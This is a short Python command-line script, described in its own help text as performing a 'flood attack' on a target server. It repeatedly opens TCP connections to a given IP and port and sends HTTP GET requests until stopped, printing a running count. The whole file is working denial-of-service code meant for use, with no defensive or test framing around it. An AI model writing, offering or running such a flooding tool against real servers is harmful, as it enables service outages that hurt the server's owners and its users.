#!/usr/bin/env python3

import argparse
import socket
import signal

parser = argparse.ArgumentParser(
    prog="flood", description="Performs a flood attack on the target server"
)
parser.add_argument("ip", default="127.0.0.1", help="IP address of the target server")
parser.add_argument(
    "-p", "--port", default=80, help="port of webserver [default: 80]", type=int
)
args = parser.parse_args()

request = "GET /test HTTP/1.1\r\n\r\n"
count = 1

def ctrlc_handler(signal, frame):
    print(f"INFO: Sent {count} requests")
    print("INFO: Ctrl-C recieved, stopping attack")
    exit(0)


def init_socket():
    s = socket.socket()
    try:
        s.connect((args.ip, args.port))
    except socket.error:
        print("ERROR: Couldn't extablish TCP connection with server")
        s.close()
        exit(1)
    return s


def main():
    signal.signal(signal.SIGINT, ctrlc_handler)

    print("INFO: performing attack")
    global count
    while True:
        s = init_socket()
        try:
            s.sendall(str.encode(request))
        except socket.error:
            print("SocketError: The other party closed the connection")
            s.close()
            exit(1)
        print(f"\033[2KINFO: Sent {count} requests\r", end="")
        count += 1

    print(f"INFO: Sent {count} requests")
    s.close()

if __name__ == "__main__":
    main()
